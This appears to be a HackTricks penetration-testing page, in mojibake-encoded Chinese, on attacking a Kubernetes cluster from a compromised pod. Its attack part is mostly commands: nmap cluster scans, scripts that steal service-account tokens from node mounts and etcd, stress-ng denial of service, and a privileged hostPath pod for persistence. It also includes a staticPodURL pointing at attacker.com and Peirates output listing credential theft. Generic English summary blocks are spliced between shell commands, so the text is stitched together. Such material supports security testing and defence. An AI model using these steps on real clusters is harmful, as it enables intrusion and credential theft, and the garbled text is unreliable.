# ä» Pod å†…éƒ¨æ”»å‡» Kubernetes

{% hint style="success" %}
å­¦ä¹ å¹¶å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å¹¶å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æ£€æŸ¥[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## **Pod é€ƒé€¸**

**å¦‚æœä½ è¶³å¤Ÿå¹¸è¿ï¼Œä½ å¯èƒ½èƒ½å¤Ÿä»ä¸­é€ƒè„±åˆ°èŠ‚ç‚¹:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### ä» Pod ä¸­é€ƒè„±

ä¸ºäº†å°è¯•ä» Pod ä¸­é€ƒè„±ï¼Œä½ å¯èƒ½éœ€è¦**å…ˆæå‡æƒé™**ï¼Œä¸€äº›å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹çš„æŠ€æœ¯ï¼š

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

ä½ å¯ä»¥æ£€æŸ¥è¿™äº›**Docker é€ƒé€¸**æ¥å°è¯•é€ƒè„±ä½ å·²ç»æ”»é™·çš„ Podï¼š

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### æ»¥ç”¨ Kubernetes æƒé™

å¦‚åœ¨å…³äº**Kubernetes æšä¸¾**çš„éƒ¨åˆ†æ‰€è¿°ï¼š

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

é€šå¸¸ï¼ŒPods åœ¨å…¶ä¸­è¿è¡Œçš„æ—¶å€™ä¼šæœ‰ä¸€ä¸ª**æœåŠ¡è´¦æˆ·ä»¤ç‰Œ**ã€‚è¿™ä¸ªæœåŠ¡è´¦æˆ·å¯èƒ½é™„æœ‰ä¸€äº›**æƒé™**ï¼Œä½ å¯ä»¥**æ»¥ç”¨**è¿™äº›æƒé™æ¥**ç§»åŠ¨**åˆ°å…¶ä»– Podsï¼Œç”šè‡³**é€ƒè„±**åˆ°é›†ç¾¤å†…é…ç½®çš„èŠ‚ç‚¹ã€‚æŸ¥çœ‹å¦‚ä½•æ“ä½œï¼š

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### æ»¥ç”¨äº‘æƒé™

å¦‚æœ Pod åœ¨**äº‘ç¯å¢ƒ**ä¸­è¿è¡Œï¼Œä½ å¯èƒ½èƒ½å¤Ÿ**ä»å…ƒæ•°æ®ç«¯ç‚¹æ³„æ¼ä»¤ç‰Œ**å¹¶ä½¿ç”¨å®ƒæå‡æƒé™ã€‚

## æœç´¢æ˜“å—æ”»å‡»çš„ç½‘ç»œæœåŠ¡

ç”±äºä½ åœ¨ Kubernetes ç¯å¢ƒå†…éƒ¨ï¼Œå¦‚æœæ— æ³•é€šè¿‡æ»¥ç”¨å½“å‰ Pod çš„æƒé™æå‡æƒé™ï¼Œä¹Ÿæ— æ³•é€ƒè„±å®¹å™¨ï¼Œä½ åº”è¯¥**æœç´¢æ½œåœ¨æ˜“å—æ”»å‡»çš„æœåŠ¡ã€‚**

### æœåŠ¡

**ä¸ºæ­¤ï¼Œä½ å¯ä»¥å°è¯•è·å– Kubernetes ç¯å¢ƒä¸­çš„æ‰€æœ‰æœåŠ¡ï¼š**
```
kubectl get svc --all-namespaces
```
é»˜è®¤æƒ…å†µä¸‹ï¼ŒKubernetesä½¿ç”¨å¹³é¢ç½‘ç»œæ¶æ„ï¼Œè¿™æ„å‘³ç€**é›†ç¾¤ä¸­çš„ä»»ä½•Pod/Serviceéƒ½å¯ä»¥ç›¸äº’é€šä¿¡**ã€‚é›†ç¾¤ä¸­çš„**å‘½åç©ºé—´**é»˜è®¤æƒ…å†µä¸‹**æ²¡æœ‰ä»»ä½•ç½‘ç»œå®‰å…¨é™åˆ¶**ã€‚å‘½åç©ºé—´ä¸­çš„ä»»ä½•äººéƒ½å¯ä»¥ä¸å…¶ä»–å‘½åç©ºé—´é€šä¿¡ã€‚

### æ‰«æ

ä»¥ä¸‹Bashè„šæœ¬ï¼ˆå–è‡ª[Kubernetesç ”è®¨ä¼š](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)ï¼‰å°†å®‰è£…å¹¶æ‰«æKubernetesé›†ç¾¤çš„IPèŒƒå›´ï¼š
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
æŸ¥çœ‹ä»¥ä¸‹é¡µé¢ï¼Œäº†è§£å¦‚ä½•**æ”»å‡»Kubernetesç‰¹å®šæœåŠ¡**ä»¥**å±å®³å…¶ä»–Pod/æ•´ä¸ªç¯å¢ƒ**ï¼š

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

### å—…æ¢

å¦‚æœ**è¢«å…¥ä¾µçš„Podæ­£åœ¨è¿è¡Œä¸€äº›æ•æ„ŸæœåŠ¡**ï¼Œå…¶ä»–Podéœ€è¦è¿›è¡Œèº«ä»½éªŒè¯ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿé€šè¿‡**å—…æ¢æœ¬åœ°é€šä¿¡**æ¥è·å–å…¶ä»–Podå‘é€çš„å‡­æ®ã€‚

## ç½‘ç»œæ¬ºéª—

é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¸å¦‚**ARPæ¬ºéª—**ï¼ˆä»¥åŠç”±æ­¤å¼•å‘çš„**DNSæ¬ºéª—**ï¼‰ç­‰æŠ€æœ¯åœ¨Kubernetesç½‘ç»œä¸­èµ·ä½œç”¨ã€‚ç„¶åï¼Œåœ¨Podå†…éƒ¨ï¼Œå¦‚æœæ‚¨æ‹¥æœ‰**NET\_RAWåŠŸèƒ½**ï¼ˆé»˜è®¤æƒ…å†µä¸‹å·²å­˜åœ¨ï¼‰ï¼Œæ‚¨å°†èƒ½å¤Ÿå‘é€è‡ªå®šä¹‰ç²¾å¿ƒåˆ¶ä½œçš„ç½‘ç»œæ•°æ®åŒ…ï¼Œå¹¶é€šè¿‡**ARPæ¬ºéª—å¯¹åŒä¸€èŠ‚ç‚¹ä¸­è¿è¡Œçš„æ‰€æœ‰Podæ‰§è¡Œä¸­é—´äººæ”»å‡»**ã€‚\
æ­¤å¤–ï¼Œå¦‚æœ**æ¶æ„Pod**æ­£åœ¨**ä¸DNSæœåŠ¡å™¨åœ¨åŒä¸€èŠ‚ç‚¹ä¸Šè¿è¡Œ**ï¼Œæ‚¨å°†èƒ½å¤Ÿå¯¹é›†ç¾¤ä¸­çš„æ‰€æœ‰Podæ‰§è¡Œ**DNSæ¬ºéª—æ”»å‡»**ã€‚

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## èŠ‚ç‚¹æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰

åœ¨Kubernetesæ¸…å•ä¸­æ²¡æœ‰èµ„æºè§„èŒƒï¼Œä¸”å®¹å™¨æ²¡æœ‰**åº”ç”¨é™åˆ¶**èŒƒå›´ã€‚ä½œä¸ºæ”»å‡»è€…ï¼Œæˆ‘ä»¬å¯ä»¥**æ¶ˆè€—Pod/éƒ¨ç½²è¿è¡Œçš„æ‰€æœ‰èµ„æº**ï¼Œä½¿å…¶ä»–èµ„æºæ¯ç«­ï¼Œå¹¶å¯¼è‡´ç¯å¢ƒå‘ç”ŸDoSã€‚

å¯ä»¥ä½¿ç”¨è¯¸å¦‚[**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng)ä¹‹ç±»çš„å·¥å…·æ¥å®ç°ï¼š
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
æ‚¨å¯ä»¥åœ¨è¿è¡Œ`stress-ng`æ—¶å’Œä¹‹åçœ‹åˆ°å·®å¼‚
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## èŠ‚ç‚¹åæ¸—é€

å¦‚æœä½ æˆåŠŸ**ä»å®¹å™¨ä¸­é€ƒè„±**ï¼Œä½ ä¼šåœ¨èŠ‚ç‚¹ä¸­å‘ç°ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿ï¼š

- **å®¹å™¨è¿è¡Œæ—¶**è¿›ç¨‹ï¼ˆDockerï¼‰
- åœ¨èŠ‚ç‚¹ä¸­è¿è¡Œçš„æ›´å¤š**pod/å®¹å™¨**ï¼Œä½ å¯ä»¥åƒè¿™ä¸ªä¸€æ ·æ»¥ç”¨ï¼ˆæ›´å¤šä»¤ç‰Œï¼‰
- æ•´ä¸ª**æ–‡ä»¶ç³»ç»Ÿ**å’Œ**æ“ä½œç³»ç»Ÿ**ä¸€èˆ¬æƒ…å†µä¸‹
- **Kube-Proxy** æœåŠ¡æ­£åœ¨ç›‘å¬
- **Kubelet** æœåŠ¡æ­£åœ¨ç›‘å¬ã€‚æ£€æŸ¥é…ç½®æ–‡ä»¶ï¼š
  - ç›®å½•ï¼š`/var/lib/kubelet/`
  - `/var/lib/kubelet/kubeconfig`
  - `/var/lib/kubelet/kubelet.conf`
  - `/var/lib/kubelet/config.yaml`
  - `/var/lib/kubelet/kubeadm-flags.env`
  - `/etc/kubernetes/kubelet-kubeconfig`
- å…¶ä»–**Kuberneteså¸¸è§æ–‡ä»¶**ï¼š
  - `$HOME/.kube/config` - **ç”¨æˆ·é…ç½®**
  - `/etc/kubernetes/kubelet.conf`- **å¸¸è§„é…ç½®**
  - `/etc/kubernetes/bootstrap-kubelet.conf` - **å¼•å¯¼é…ç½®**
  - `/etc/kubernetes/manifests/etcd.yaml` - **etcd é…ç½®**
  - `/etc/kubernetes/pki` - **Kubernetes å¯†é’¥**

### æŸ¥æ‰¾èŠ‚ç‚¹ kubeconfig

å¦‚æœä½ åœ¨ä¹‹å‰æ³¨é‡Šçš„è·¯å¾„ä¸­æ‰¾ä¸åˆ° kubeconfig æ–‡ä»¶ï¼Œ**æ£€æŸ¥ kubelet è¿›ç¨‹çš„å‚æ•° `--kubeconfig`**ï¼š
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### çªƒå–æœºå¯†
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
è„šæœ¬ [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) å°†è‡ªåŠ¨è·å–å…¶ä»– pod çš„ä»¤ç‰Œï¼Œå¹¶æ£€æŸ¥å®ƒä»¬æ˜¯å¦å…·æœ‰æ‚¨æ­£åœ¨å¯»æ‰¾çš„æƒé™ï¼ˆè€Œä¸æ˜¯æ‚¨é€ä¸ªæŸ¥çœ‹ï¼‰ã€‚
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### ç‰¹æƒ DaemonSets

ä¸€ä¸ª DaemonSet æ˜¯ä¸€ä¸ª**pod**ï¼Œå°†åœ¨**é›†ç¾¤çš„æ‰€æœ‰èŠ‚ç‚¹**ä¸Š**è¿è¡Œ**ã€‚å› æ­¤ï¼Œå¦‚æœä¸€ä¸ª DaemonSet é…ç½®äº†ä¸€ä¸ª**ç‰¹æƒæœåŠ¡è´¦æˆ·**ï¼Œåœ¨**æ‰€æœ‰èŠ‚ç‚¹**ä¸Šä½ å°†èƒ½å¤Ÿæ‰¾åˆ°é‚£ä¸ª**ç‰¹æƒæœåŠ¡è´¦æˆ·**çš„**ä»¤ç‰Œ**ï¼Œä½ å¯ä»¥æ»¥ç”¨å®ƒã€‚

è¿™ä¸ªæ¼æ´å’Œå‰ä¸€èŠ‚ä¸­çš„ä¸€æ ·ï¼Œä½†ç°åœ¨ä½ ä¸å†ä¾èµ–è¿æ°”ã€‚

### åˆ‡æ¢åˆ°äº‘ç«¯

å¦‚æœé›†ç¾¤ç”±äº‘æœåŠ¡ç®¡ç†ï¼Œé€šå¸¸**èŠ‚ç‚¹**å¯¹**å…ƒæ•°æ®**ç«¯ç‚¹çš„è®¿é—®æƒé™ä¸ Pod ä¸åŒã€‚å› æ­¤ï¼Œå°è¯•ä»èŠ‚ç‚¹ï¼ˆæˆ–ä»ä¸€ä¸ªå…·æœ‰ hostNetwork ä¸º True çš„ podï¼‰**è®¿é—®å…ƒæ•°æ®ç«¯ç‚¹**ï¼š

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### çªƒå– etcd

å¦‚æœä½ å¯ä»¥æŒ‡å®šå°†è¿è¡Œå®¹å™¨çš„èŠ‚ç‚¹çš„[**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node)ï¼Œåœ¨æ§åˆ¶å¹³é¢èŠ‚ç‚¹å†…è·å–ä¸€ä¸ª shell å¹¶è·å–**etcd æ•°æ®åº“**ï¼š
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
control-planeèŠ‚ç‚¹å…·æœ‰**ä¸»èŠ‚ç‚¹è§’è‰²**ï¼Œåœ¨**äº‘æ‰˜ç®¡é›†ç¾¤ä¸­ï¼Œæ‚¨å°†æ— æ³•åœ¨å…¶ä¸­è¿è¡Œä»»ä½•å†…å®¹**ã€‚

#### ä»etcdä¸­è¯»å–æœºå¯†

å¦‚æœæ‚¨å¯ä»¥åœ¨æ§åˆ¶å¹³é¢èŠ‚ç‚¹ä¸Šä½¿ç”¨podè§„èŒƒä¸­çš„`nodeName`é€‰æ‹©å™¨è¿è¡Œæ‚¨çš„podï¼Œé‚£ä¹ˆæ‚¨å¯èƒ½å¾ˆå®¹æ˜“è®¿é—®åŒ…å«é›†ç¾¤æ‰€æœ‰é…ç½®ï¼ˆåŒ…æ‹¬æ‰€æœ‰æœºå¯†ï¼‰çš„`etcd`æ•°æ®åº“ã€‚

ä»¥ä¸‹æ˜¯ä¸€ç§å¿«é€Ÿè€Œç®€å•çš„æ–¹æ³•ï¼Œå¯ä»¥ä»æ‚¨æ‰€åœ¨çš„æ§åˆ¶å¹³é¢èŠ‚ç‚¹ä¸Šè¿è¡Œçš„`etcd`ä¸­è·å–æœºå¯†ã€‚å¦‚æœæ‚¨æƒ³è¦ä¸€ä¸ªæ›´ä¼˜é›…çš„è§£å†³æ–¹æ¡ˆï¼Œå¯ä»¥ä½¿ç”¨å¸¦æœ‰`etcd`å®¢æˆ·ç«¯å®ç”¨ç¨‹åº`etcdctl`çš„podï¼Œå¹¶ä½¿ç”¨æ§åˆ¶å¹³é¢èŠ‚ç‚¹çš„å‡­æ®è¿æ¥åˆ°`etcd`ï¼Œæ— è®ºå®ƒåœ¨ä½•å¤„è¿è¡Œï¼Œè¯·æŸ¥çœ‹[@mauilion](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml)æä¾›çš„[æ­¤ç¤ºä¾‹æ¸…å•](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml)ã€‚

**æ£€æŸ¥`etcd`æ˜¯å¦åœ¨æ§åˆ¶å¹³é¢èŠ‚ç‚¹ä¸Šè¿è¡Œï¼Œå¹¶æŸ¥çœ‹æ•°æ®åº“æ‰€åœ¨ä½ç½®ï¼ˆè¿™æ˜¯åœ¨`kubeadm`åˆ›å»ºçš„é›†ç¾¤ä¸Šï¼‰**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
```markdown
## Attacking Kubernetes from Inside a Pod

### Introduction

In a Kubernetes cluster, if an attacker gains access to a pod, they can potentially escalate their privileges to gain control over the entire cluster. This section explores various techniques that can be used by an attacker to compromise a Kubernetes cluster from inside a pod.

### Techniques

1. **Accessing the Kubernetes API Server**: An attacker with access to a pod can try to access the Kubernetes API server using service account tokens mounted inside the pod.

2. **Pod Escape**: Attackers can attempt to break out of the pod's container to gain access to the host node and potentially other pods running on the same node.

3. **Network Sniffing**: By sniffing network traffic within the pod, an attacker can intercept sensitive information such as API requests and credentials.

4. **Pod Resource Exhaustion**: Attackers can consume excessive resources within a pod to cause a denial of service (DoS) attack, impacting other pods in the cluster.

### Mitigations

To prevent attacks from inside a pod, consider implementing the following mitigations:

- **Restrict Pod Permissions**: Limit the permissions assigned to pods to reduce the impact of a compromised pod.

- **Network Policies**: Implement network policies to restrict pod-to-pod communication and limit the attack surface.

- **Pod Security Policies**: Enforce security policies to control the actions that pods can perform, such as accessing the host node or other pods.

By understanding these attack techniques and implementing appropriate mitigations, organizations can enhance the security of their Kubernetes clusters.
```
```bash
data-dir=/var/lib/etcd
```
**æŸ¥çœ‹ etcd æ•°æ®åº“ä¸­çš„æ•°æ®ï¼š**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**ä»æ•°æ®åº“ä¸­æå–ä»¤ç‰Œå¹¶æ˜¾ç¤ºæœåŠ¡è´¦æˆ·åç§°**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**ç›¸åŒå‘½ä»¤ï¼Œä½†æ·»åŠ ä¸€äº› greps æ¥ä»…è¿”å› kube-system å‘½åç©ºé—´ä¸­çš„é»˜è®¤ä»¤ç‰Œ**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
```markdown
## Attacking Kubernetes from Inside a Pod

### Introduction

When an attacker gains access to a Kubernetes pod, either through a compromised container or by exploiting a vulnerability, they can leverage this access to further compromise the Kubernetes cluster. This article explores various techniques that an attacker can use to escalate privileges and move laterally within the cluster from inside a pod.

### Privilege Escalation

#### Exploiting Misconfigured RBAC Roles

If the pod's service account has overly permissive Role-Based Access Control (RBAC) roles assigned to it, an attacker can abuse these privileges to perform unauthorized actions within the cluster. By exploiting misconfigured RBAC roles, an attacker can gain additional permissions and potentially take control of the entire cluster.

#### Accessing the Kubernetes API Server

Once inside a pod, an attacker can attempt to access the Kubernetes API server using tools like `kubectl` or by sending direct API requests. If successful, the attacker can interact with the API server to gather sensitive information, modify resources, or deploy malicious workloads.

### Lateral Movement

#### Pod Hopping

An attacker can move laterally within the cluster by compromising multiple pods. By exploiting vulnerabilities or misconfigurations in other pods, the attacker can pivot from one pod to another, gradually expanding their control and influence over the cluster.

#### Node Compromise

If the attacker can escalate their privileges to the node level, they can potentially compromise the entire node and all the pods running on it. This can provide the attacker with a significant foothold in the cluster and enable them to carry out more extensive attacks.

### Conclusion

Securing Kubernetes clusters requires not only protecting the external attack surface but also considering the threats that can originate from within the cluster. By understanding how attackers can exploit vulnerabilities from inside a pod, organizations can better defend against internal threats and secure their Kubernetes deployments.
```
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### é™æ€/é•œåƒåŒ– Pod æŒä¹…æ€§

_é™æ€ Pod_ ç”±ç‰¹å®šèŠ‚ç‚¹ä¸Šçš„ kubelet å®ˆæŠ¤ç¨‹åºç›´æ¥ç®¡ç†ï¼Œè€Œæ— éœ€ API æœåŠ¡å™¨è§‚å¯Ÿå®ƒä»¬ã€‚ä¸ç”±æ§åˆ¶å¹³é¢ç®¡ç†çš„ Podï¼ˆä¾‹å¦‚ Deploymentï¼‰ä¸åŒï¼›ç›¸åï¼Œ**kubelet ç›‘è§†æ¯ä¸ªé™æ€ Pod**ï¼ˆå¦‚æœå¤±è´¥ï¼Œåˆ™é‡æ–°å¯åŠ¨ï¼‰ã€‚

å› æ­¤ï¼Œé™æ€ Pod å§‹ç»ˆ**ç»‘å®šåˆ°ç‰¹å®šèŠ‚ç‚¹ä¸Šçš„ä¸€ä¸ª Kubelet**ã€‚

**kubelet ä¼šè‡ªåŠ¨å°è¯•ä¸ºæ¯ä¸ªé™æ€ Pod åœ¨ Kubernetes API æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªé•œåƒ Pod**ã€‚è¿™æ„å‘³ç€åœ¨èŠ‚ç‚¹ä¸Šè¿è¡Œçš„ Pod å¯ä»¥åœ¨ API æœåŠ¡å™¨ä¸Šçœ‹åˆ°ï¼Œä½†æ— æ³•ä»é‚£é‡Œæ§åˆ¶ã€‚Pod åç§°å°†ä»¥èŠ‚ç‚¹ä¸»æœºåä¸ºåç¼€ï¼Œå¹¶å¸¦æœ‰å‰å¯¼è¿å­—ç¬¦ã€‚

{% hint style="danger" %}
é™æ€ Pod çš„ **`spec` ä¸èƒ½å¼•ç”¨å…¶ä»– API å¯¹è±¡**ï¼ˆä¾‹å¦‚ ServiceAccountã€ConfigMapã€Secret ç­‰ã€‚å› æ­¤ï¼Œ**æ— æ³•æ»¥ç”¨æ­¤è¡Œä¸ºæ¥ä½¿ç”¨ä»»æ„ ServiceAccount å¯åŠ¨ Pod** åœ¨å½“å‰èŠ‚ç‚¹ä¸­ä»¥å±å®³é›†ç¾¤ã€‚ä½†æ‚¨å¯ä»¥ä½¿ç”¨æ­¤åŠŸèƒ½åœ¨ä¸åŒå‘½åç©ºé—´ä¸­è¿è¡Œ Podï¼ˆå¦‚æœå‡ºäºæŸç§åŸå› æœ‰ç”¨ï¼‰ã€‚
{% endhint %}

å¦‚æœæ‚¨åœ¨èŠ‚ç‚¹ä¸»æœºå†…éƒ¨ï¼Œå¯ä»¥è®©å…¶åˆ›å»ºä¸€ä¸ª**é™æ€ Pod åœ¨è‡ªèº«å†…éƒ¨**ã€‚è¿™éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºè¿™å¯èƒ½å…è®¸æ‚¨åœ¨**ä¸åŒå‘½åç©ºé—´**ï¼ˆå¦‚ **kube-system**ï¼‰ä¸­åˆ›å»ºä¸€ä¸ª Podã€‚

è¦åˆ›å»ºé™æ€ Podï¼Œ[**æ–‡æ¡£æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å¸®åŠ©**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/)ã€‚æ‚¨åŸºæœ¬ä¸Šéœ€è¦ 2 ä»¶äº‹ï¼š

* åœ¨ **kubelet æœåŠ¡** ä¸­é…ç½®å‚æ•° **`--pod-manifest-path=/etc/kubernetes/manifests`**ï¼Œæˆ–åœ¨ **kubelet é…ç½®**ï¼ˆ[**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)ï¼‰ä¸­å¹¶é‡æ–°å¯åŠ¨æœåŠ¡
* åœ¨ **`/etc/kubernetes/manifests`** ä¸­çš„ **pod å®šä¹‰**ä¸­åˆ›å»ºå®šä¹‰

**å¦ä¸€ç§æ›´éšè”½çš„æ–¹æ³•æ˜¯ï¼š**

* ä¿®æ”¹ **kubelet** é…ç½®æ–‡ä»¶ä¸­çš„å‚æ•° **`staticPodURL`**ï¼Œè®¾ç½®ç±»ä¼¼ `staticPodURL: http://attacker.com:8765/pod.yaml`ã€‚è¿™å°†ä½¿ kubelet è¿›ç¨‹åˆ›å»ºä¸€ä¸ª**é™æ€ Pod**ï¼Œä»æŒ‡å®šçš„ URL è·å–**é…ç½®**ã€‚

**ç¤ºä¾‹**çš„ **pod** é…ç½®ï¼Œç”¨äºåœ¨ **kube-system** ä¸­åˆ›å»ºä¸€ä¸ªç‰¹æƒ podï¼Œå–è‡ª[**è¿™é‡Œ**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/)ï¼š
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### åˆ é™¤ pods + æ— æ³•è°ƒåº¦çš„èŠ‚ç‚¹

å¦‚æœæ”»å‡»è€…å·²ç»**å…¥ä¾µäº†ä¸€ä¸ªèŠ‚ç‚¹**ï¼Œå¹¶ä¸”å¯ä»¥**åˆ é™¤å…¶ä»–èŠ‚ç‚¹ä¸Šçš„ pods**ï¼Œå¹¶ä¸”**ä½¿å…¶ä»–èŠ‚ç‚¹æ— æ³•æ‰§è¡Œ pods**ï¼Œé‚£ä¹ˆ pods å°†åœ¨è¢«å…¥ä¾µçš„èŠ‚ç‚¹ä¸Šé‡æ–°è¿è¡Œï¼Œä»–å°†èƒ½å¤Ÿ**çªƒå–åœ¨å…¶ä¸­è¿è¡Œçš„ä»¤ç‰Œ**ã€‚\
æœ‰å…³[**æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—®æ­¤é“¾æ¥**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes)ã€‚

## è‡ªåŠ¨åŒ–å·¥å…·

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
